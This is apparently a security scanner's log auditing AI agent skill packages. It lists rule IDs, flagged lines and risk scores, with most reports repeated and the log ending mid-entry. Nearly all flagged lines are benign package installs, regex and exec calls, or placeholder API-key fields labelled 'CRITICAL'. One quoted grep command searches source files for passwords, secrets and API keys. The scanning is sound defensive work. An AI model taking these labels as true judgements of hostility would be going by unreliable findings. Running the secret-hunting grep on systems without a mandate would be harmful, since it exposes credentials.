  [CMD001] in interval-profiling-performance-analyzer/SKILL.md:176
    Pattern: sudo apt-get install linux-tools-generic
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/references/profiling-tools.md:98
    Pattern: **Installation:** `sudo apt-get install linux-tools-generic`
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/references/profiling-tools.md:126
    Pattern: **Installation:** `sudo apt-get install valgrind`
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/references/profiling-tools.md:165
    Pattern: 4. **Disable frequency scaling:** `sudo cpupower frequency-set --governor per...
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/scripts/profile_cpp.py:38
    Pattern: print("Error: perf not found. Install with: sudo apt-get install linux-tools-...
    Confidence: MEDIUM
  [CMD001] in interval-profiling-performance-analyzer/scripts/profile_cpp.py:103
    Pattern: print("Error: gprof not found. Install with: sudo apt-get install binutils")
    Confidence: MEDIUM
  [INJ001] in interval-profiling-performance-analyzer/scripts/profile_python.py:30
    Pattern: code = compile(f.read(), script_path, 'exec')
    Confidence: MEDIUM
  [INJ001] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM

[*] WARNING Issues (7):
  [CMD002] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM
  [INJ002] in interval-profiling-performance-analyzer/scripts/profile_python.py:30
    Pattern: code = compile(f.read(), script_path, 'exec')
    Confidence: MEDIUM
  [INJ002] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM
  [OBF001] in interval-profiling-performance-analyzer/scripts/profile_python.py:30
    Pattern: code = compile(f.read(), script_path, 'exec')
    Confidence: MEDIUM
  [OBF001] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM
  [OBF002] in interval-profiling-performance-analyzer/scripts/profile_python.py:30
    Pattern: code = compile(f.read(), script_path, 'exec')
    Confidence: MEDIUM
  [OBF002] in interval-profiling-performance-analyzer/scripts/profile_python.py:35
    Pattern: exec(code, script_globals)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 8
  Critical Issues: 9
  Warning Issues: 7
  Info Issues: 0
  Total Issues: 16

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/interval-profiling-performance-analyzer.json
Scanning: invariant-inference

[*] Scanning Skill: invariant-inference

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/invariant-inference.html
Scanning: invariant-inference

[*] Scanning Skill: invariant-inference

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/invariant-inference.json
Scanning: issue-report-generator

[*] Scanning Skill: issue-report-generator

[?] Risk Level: LOW (2.9/10)

[!] CRITICAL Issues (7):
  [FILE001] in issue-report-generator/SKILL.md:206
    Pattern: 2. Or call: `userService.authenticate("nonexistent@example.com", "password")`
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/SKILL.md:226
    Pattern: String hashedPassword = user.getPassword(); // user is null here
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/SKILL.md:230
    Pattern: The exception occurs because the `user` object is null when the user lookup f...
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/references/report_patterns.md:574
    Pattern: 2. Or call: `userService.authenticate("nonexistent@example.com", "password")`
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/references/report_patterns.md:594
    Pattern: String hashedPassword = user.getPassword(); // user is null here
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/references/report_patterns.md:598
    Pattern: The exception occurs because the `user` object is null when the user lookup f...
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/references/report_patterns.md:608
    Pattern: String hashedPassword = user.getPassword();
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 7
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 7

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/issue-report-generator.html
Scanning: issue-report-generator

[*] Scanning Skill: issue-report-generator

[?] Risk Level: LOW (2.9/10)

[!] CRITICAL Issues (7):
  [FILE001] in issue-report-generator/SKILL.md:206
    Pattern: 2. Or call: `userService.authenticate("nonexistent@example.com", "password")`
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/SKILL.md:226
    Pattern: String hashedPassword = user.getPassword(); // user is null here
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/SKILL.md:230
    Pattern: The exception occurs because the `user` object is null when the user lookup f...
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/references/report_patterns.md:574
    Pattern: 2. Or call: `userService.authenticate("nonexistent@example.com", "password")`
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/references/report_patterns.md:594
    Pattern: String hashedPassword = user.getPassword(); // user is null here
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/references/report_patterns.md:598
    Pattern: The exception occurs because the `user` object is null when the user lookup f...
    Confidence: MEDIUM
  [FILE001] in issue-report-generator/references/report_patterns.md:608
    Pattern: String hashedPassword = user.getPassword();
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 7
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 7

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/issue-report-generator.json
Scanning: java-api-consistency-validator

[*] Scanning Skill: java-api-consistency-validator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/java-api-consistency-validator.html
Scanning: java-api-consistency-validator

[*] Scanning Skill: java-api-consistency-validator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/java-api-consistency-validator.json
Scanning: java-regression-test-generator

[*] Scanning Skill: java-regression-test-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/java-regression-test-generator.html
Scanning: java-regression-test-generator

[*] Scanning Skill: java-regression-test-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/java-regression-test-generator.json
Scanning: java-test-updater

[*] Scanning Skill: java-test-updater

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/java-test-updater.html
Scanning: java-test-updater

[*] Scanning Skill: java-test-updater

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/java-test-updater.json
Scanning: legacy-code-summarizer

[*] Scanning Skill: legacy-code-summarizer

[?] Risk Level: LOW (3.3/10)

[!] CRITICAL Issues (7):
  [FILE001] in legacy-code-summarizer/SKILL.md:269
    Pattern: # pmd cpd --minimum-tokens 100 --files src/
    Confidence: MEDIUM
  [CMD001] in legacy-code-summarizer/references/dependency_analysis.md:453
    Pattern: sudo apt-get install graphviz
    Confidence: MEDIUM
  [FILE001] in legacy-code-summarizer/references/code_quality_checklist.md:128
    Pattern: pmd cpd --minimum-tokens 100 --files src/
    Confidence: MEDIUM
  [FILE001] in legacy-code-summarizer/references/code_quality_checklist.md:177
    Pattern: pmd cpd --minimum-tokens 50 --files src/ --language python
    Confidence: MEDIUM
  [FILE001] in legacy-code-summarizer/references/code_quality_checklist.md:183
    Pattern: pmd cpd --minimum-tokens 100 --files src/
    Confidence: MEDIUM
  [FILE001] in legacy-code-summarizer/references/code_quality_checklist.md:434
    Pattern: grep -rni "password\|secret\|api_key" --include="*.py" --include="*.java" src...
    Confidence: MEDIUM
  [NET001] in legacy-code-summarizer/references/architecture_patterns.md:184
    Pattern: const response = await fetch('http://payment-service:8080/process', {
    Confidence: LOW

[*] WARNING Issues (3):
  [DEP001] in legacy-code-summarizer/references/dependency_analysis.md:348
    Pattern: npm install -g madge
    Confidence: MEDIUM
  [DEP001] in legacy-code-summarizer/references/dependency_analysis.md:375
    Pattern: npm install -g dependency-cruiser
    Confidence: MEDIUM
  [DEP001] in legacy-code-summarizer/references/dependency_analysis.md:416
    Pattern: npm install -g depcheck
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 7
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/legacy-code-summarizer.html
Scanning: legacy-code-summarizer

[*] Scanning Skill: legacy-code-summarizer

[?] Risk Level: LOW (3.3/10)

[!] CRITICAL Issues (7):
  [FILE001] in legacy-code-summarizer/SKILL.md:269
    Pattern: # pmd cpd --minimum-tokens 100 --files src/
    Confidence: MEDIUM
  [CMD001] in legacy-code-summarizer/references/dependency_analysis.md:453
    Pattern: sudo apt-get install graphviz
    Confidence: MEDIUM
  [FILE001] in legacy-code-summarizer/references/code_quality_checklist.md:128
    Pattern: pmd cpd --minimum-tokens 100 --files src/
    Confidence: MEDIUM
  [FILE001] in legacy-code-summarizer/references/code_quality_checklist.md:177
    Pattern: pmd cpd --minimum-tokens 50 --files src/ --language python
    Confidence: MEDIUM
  [FILE001] in legacy-code-summarizer/references/code_quality_checklist.md:183
    Pattern: pmd cpd --minimum-tokens 100 --files src/
    Confidence: MEDIUM
  [FILE001] in legacy-code-summarizer/references/code_quality_checklist.md:434
    Pattern: grep -rni "password\|secret\|api_key" --include="*.py" --include="*.java" src...
    Confidence: MEDIUM
  [NET001] in legacy-code-summarizer/references/architecture_patterns.md:184
    Pattern: const response = await fetch('http://payment-service:8080/process', {
    Confidence: LOW

[*] WARNING Issues (3):
  [DEP001] in legacy-code-summarizer/references/dependency_analysis.md:348
    Pattern: npm install -g madge
    Confidence: MEDIUM
  [DEP001] in legacy-code-summarizer/references/dependency_analysis.md:375
    Pattern: npm install -g dependency-cruiser
    Confidence: MEDIUM
  [DEP001] in legacy-code-summarizer/references/dependency_analysis.md:416
    Pattern: npm install -g depcheck
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 7
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/legacy-code-summarizer.json
Scanning: lemma-discovery-assistant

[*] Scanning Skill: lemma-discovery-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/lemma-discovery-assistant.html
Scanning: lemma-discovery-assistant

[*] Scanning Skill: lemma-discovery-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/lemma-discovery-assistant.json
Scanning: library-for-proof-advisor

[*] Scanning Skill: library-for-proof-advisor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/library-for-proof-advisor.html
Scanning: library-for-proof-advisor

[*] Scanning Skill: library-for-proof-advisor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/library-for-proof-advisor.json
Scanning: markdown-document-structurer

[*] Scanning Skill: markdown-document-structurer

[OK] Risk Level: SAFE (0.8/10)

[!] CRITICAL Issues (1):
  [INJ001] in markdown-document-structurer/scripts/analyze_structure.py:61
    Pattern: toc_pattern = re.compile(r'##\s+Table of Contents', re.IGNORECASE)
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in markdown-document-structurer/scripts/analyze_structure.py:61
    Pattern: toc_pattern = re.compile(r'##\s+Table of Contents', re.IGNORECASE)
    Confidence: MEDIUM
  [OBF001] in markdown-document-structurer/scripts/analyze_structure.py:61
    Pattern: toc_pattern = re.compile(r'##\s+Table of Contents', re.IGNORECASE)
    Confidence: MEDIUM
  [OBF002] in markdown-document-structurer/scripts/analyze_structure.py:61
    Pattern: toc_pattern = re.compile(r'##\s+Table of Contents', re.IGNORECASE)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/markdown-document-structurer.html
Scanning: markdown-document-structurer

[*] Scanning Skill: markdown-document-structurer

[OK] Risk Level: SAFE (0.8/10)

[!] CRITICAL Issues (1):
  [INJ001] in markdown-document-structurer/scripts/analyze_structure.py:61
    Pattern: toc_pattern = re.compile(r'##\s+Table of Contents', re.IGNORECASE)
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in markdown-document-structurer/scripts/analyze_structure.py:61
    Pattern: toc_pattern = re.compile(r'##\s+Table of Contents', re.IGNORECASE)
    Confidence: MEDIUM
  [OBF001] in markdown-document-structurer/scripts/analyze_structure.py:61
    Pattern: toc_pattern = re.compile(r'##\s+Table of Contents', re.IGNORECASE)
    Confidence: MEDIUM
  [OBF002] in markdown-document-structurer/scripts/analyze_structure.py:61
    Pattern: toc_pattern = re.compile(r'##\s+Table of Contents', re.IGNORECASE)
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 1
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/markdown-document-structurer.json
Scanning: metamorphic-property-extractor

[*] Scanning Skill: metamorphic-property-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/metamorphic-property-extractor.html
Scanning: metamorphic-property-extractor

[*] Scanning Skill: metamorphic-property-extractor

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/metamorphic-property-extractor.json
Scanning: metamorphic-test-generator

[*] Scanning Skill: metamorphic-test-generator

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in metamorphic-test-generator/scripts/generate.py:483
    Pattern: properties = list(properties_data.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 7
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/metamorphic-test-generator.html
Scanning: metamorphic-test-generator

[*] Scanning Skill: metamorphic-test-generator

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in metamorphic-test-generator/scripts/generate.py:483
    Pattern: properties = list(properties_data.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 7
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/metamorphic-test-generator.json
Scanning: mocking-test-generator

[*] Scanning Skill: mocking-test-generator

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (2):
  [FILE001] in mocking-test-generator/references/python_patterns.md:52
    Pattern: @patch.dict('os.environ', {'API_KEY': 'test_key'})
    Confidence: MEDIUM
  [FILE001] in mocking-test-generator/references/python_patterns.md:56
    Pattern: assert result.api_key == 'test_key'
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 2
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 2

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/mocking-test-generator.html
Scanning: mocking-test-generator

[*] Scanning Skill: mocking-test-generator

[OK] Risk Level: SAFE (0.9/10)

[!] CRITICAL Issues (2):
  [FILE001] in mocking-test-generator/references/python_patterns.md:52
    Pattern: @patch.dict('os.environ', {'API_KEY': 'test_key'})
    Confidence: MEDIUM
  [FILE001] in mocking-test-generator/references/python_patterns.md:56
    Pattern: assert result.api_key == 'test_key'
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 2
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 2

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/mocking-test-generator.json
Scanning: module-component-generator

[*] Scanning Skill: module-component-generator

[?] Risk Level: LOW (3.5/10)

[!] CRITICAL Issues (7):
  [FILE001] in module-component-generator/references/java-patterns.md:79
    Pattern: private final String apiKey;
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/java-patterns.md:82
    Pattern: public StripePaymentProcessor(String apiKey) {
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/java-patterns.md:83
    Pattern: this.apiKey = Objects.requireNonNull(apiKey, "API key cannot be null");
    Confidence: MEDIUM
  [INJ001] in module-component-generator/references/java-patterns.md:446
    Pattern: Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/python-patterns.md:74
    Pattern: def __init__(self, api_key: str):
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/python-patterns.md:75
    Pattern: self.api_key = api_key
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/python-patterns.md:357
    Pattern: api_key=config.get('api_key'),
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in module-component-generator/references/java-patterns.md:446
    Pattern: Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    Confidence: MEDIUM
  [OBF001] in module-component-generator/references/java-patterns.md:446
    Pattern: Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    Confidence: MEDIUM
  [OBF002] in module-component-generator/references/java-patterns.md:446
    Pattern: Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 7
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/module-component-generator.html
Scanning: module-component-generator

[*] Scanning Skill: module-component-generator

[?] Risk Level: LOW (3.5/10)

[!] CRITICAL Issues (7):
  [FILE001] in module-component-generator/references/java-patterns.md:79
    Pattern: private final String apiKey;
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/java-patterns.md:82
    Pattern: public StripePaymentProcessor(String apiKey) {
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/java-patterns.md:83
    Pattern: this.apiKey = Objects.requireNonNull(apiKey, "API key cannot be null");
    Confidence: MEDIUM
  [INJ001] in module-component-generator/references/java-patterns.md:446
    Pattern: Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/python-patterns.md:74
    Pattern: def __init__(self, api_key: str):
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/python-patterns.md:75
    Pattern: self.api_key = api_key
    Confidence: MEDIUM
  [FILE001] in module-component-generator/references/python-patterns.md:357
    Pattern: api_key=config.get('api_key'),
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in module-component-generator/references/java-patterns.md:446
    Pattern: Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    Confidence: MEDIUM
  [OBF001] in module-component-generator/references/java-patterns.md:446
    Pattern: Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    Confidence: MEDIUM
  [OBF002] in module-component-generator/references/java-patterns.md:446
    Pattern: Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 7
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/module-component-generator.json
Scanning: module-level-code-translator

[*] Scanning Skill: module-level-code-translator

[?] Risk Level: LOW (3.0/10)

[!] CRITICAL Issues (7):
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:26
    Pattern: - `requests.get(url)` → `fetch(url)` or `axios.get(url)`
    Confidence: MEDIUM
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:27
    Pattern: - `requests.post(url, json=data)` → `fetch(url, {method: 'POST', body: JSON.s...
    Confidence: MEDIUM
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:30
    Pattern: - `requests.get(url)` → `HttpClient.newHttpClient().send(request, BodyHandler...
    Confidence: MEDIUM
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:33
    Pattern: - `requests.get(url)` → `http.Get(url)`
    Confidence: MEDIUM
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:34
    Pattern: - `requests.post(url, json=data)` → `http.Post(url, "application/json", bytes...
    Confidence: MEDIUM
  [INJ001] in module-level-code-translator/references/stdlib_mappings.md:75
    Pattern: - `re.search(pattern, text)` → `Pattern.compile(pattern).matcher(text).find()`
    Confidence: MEDIUM
  [FILE001] in module-level-code-translator/references/language_mappings.md:14
    Pattern: - Python: `dict.keys()`, `dict.values()`, `dict.items()` → JS: `Object.keys()...
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in module-level-code-translator/references/stdlib_mappings.md:75
    Pattern: - `re.search(pattern, text)` → `Pattern.compile(pattern).matcher(text).find()`
    Confidence: MEDIUM
  [OBF001] in module-level-code-translator/references/stdlib_mappings.md:75
    Pattern: - `re.search(pattern, text)` → `Pattern.compile(pattern).matcher(text).find()`
    Confidence: MEDIUM
  [OBF002] in module-level-code-translator/references/stdlib_mappings.md:75
    Pattern: - `re.search(pattern, text)` → `Pattern.compile(pattern).matcher(text).find()`
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 7
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/module-level-code-translator.html
Scanning: module-level-code-translator

[*] Scanning Skill: module-level-code-translator

[?] Risk Level: LOW (3.0/10)

[!] CRITICAL Issues (7):
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:26
    Pattern: - `requests.get(url)` → `fetch(url)` or `axios.get(url)`
    Confidence: MEDIUM
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:27
    Pattern: - `requests.post(url, json=data)` → `fetch(url, {method: 'POST', body: JSON.s...
    Confidence: MEDIUM
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:30
    Pattern: - `requests.get(url)` → `HttpClient.newHttpClient().send(request, BodyHandler...
    Confidence: MEDIUM
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:33
    Pattern: - `requests.get(url)` → `http.Get(url)`
    Confidence: MEDIUM
  [NET001] in module-level-code-translator/references/stdlib_mappings.md:34
    Pattern: - `requests.post(url, json=data)` → `http.Post(url, "application/json", bytes...
    Confidence: MEDIUM
  [INJ001] in module-level-code-translator/references/stdlib_mappings.md:75
    Pattern: - `re.search(pattern, text)` → `Pattern.compile(pattern).matcher(text).find()`
    Confidence: MEDIUM
  [FILE001] in module-level-code-translator/references/language_mappings.md:14
    Pattern: - Python: `dict.keys()`, `dict.values()`, `dict.items()` → JS: `Object.keys()...
    Confidence: MEDIUM

[*] WARNING Issues (3):
  [INJ002] in module-level-code-translator/references/stdlib_mappings.md:75
    Pattern: - `re.search(pattern, text)` → `Pattern.compile(pattern).matcher(text).find()`
    Confidence: MEDIUM
  [OBF001] in module-level-code-translator/references/stdlib_mappings.md:75
    Pattern: - `re.search(pattern, text)` → `Pattern.compile(pattern).matcher(text).find()`
    Confidence: MEDIUM
  [OBF002] in module-level-code-translator/references/stdlib_mappings.md:75
    Pattern: - `re.search(pattern, text)` → `Pattern.compile(pattern).matcher(text).find()`
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 6
  Critical Issues: 7
  Warning Issues: 3
  Info Issues: 0
  Total Issues: 10

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/module-level-code-translator.json
Scanning: multi-version-behavior-comparator

[*] Scanning Skill: multi-version-behavior-comparator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/multi-version-behavior-comparator.html
Scanning: multi-version-behavior-comparator

[*] Scanning Skill: multi-version-behavior-comparator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/multi-version-behavior-comparator.json
Scanning: mutation-test-suite-optimizer

[*] Scanning Skill: mutation-test-suite-optimizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/mutation-test-suite-optimizer.html
Scanning: mutation-test-suite-optimizer

[*] Scanning Skill: mutation-test-suite-optimizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/mutation-test-suite-optimizer.json
Scanning: nl-to-constraints

[*] Scanning Skill: nl-to-constraints

[?] Risk Level: LOW (3.6/10)

[!] CRITICAL Issues (8):
  [FILE001] in nl-to-constraints/SKILL.md:117
    Pattern: "description": "Users must be able to register with email and password",
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:120
    Pattern: "Password must be at least 8 characters",
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:143
    Pattern: "when": "User enters valid email and password",
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:161
    Pattern: **Description**: Users must be able to register with email and password
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:165
    Pattern: - Password must be at least 8 characters
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:186
    Pattern: When they enter email "user@example.com" and password "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/references/constraint_patterns.md:73
    Pattern: Natural Language: "Password reset links expire 24 hours after creation"
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/references/constraint_patterns.md:75
    Pattern: Event: Password_Reset_Link_Expiration
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 8
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 8

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/nl-to-constraints.html
Scanning: nl-to-constraints

[*] Scanning Skill: nl-to-constraints

[?] Risk Level: LOW (3.6/10)

[!] CRITICAL Issues (8):
  [FILE001] in nl-to-constraints/SKILL.md:117
    Pattern: "description": "Users must be able to register with email and password",
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:120
    Pattern: "Password must be at least 8 characters",
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:143
    Pattern: "when": "User enters valid email and password",
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:161
    Pattern: **Description**: Users must be able to register with email and password
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:165
    Pattern: - Password must be at least 8 characters
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/SKILL.md:186
    Pattern: When they enter email "user@example.com" and password "SecurePass123"
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/references/constraint_patterns.md:73
    Pattern: Natural Language: "Password reset links expire 24 hours after creation"
    Confidence: MEDIUM
  [FILE001] in nl-to-constraints/references/constraint_patterns.md:75
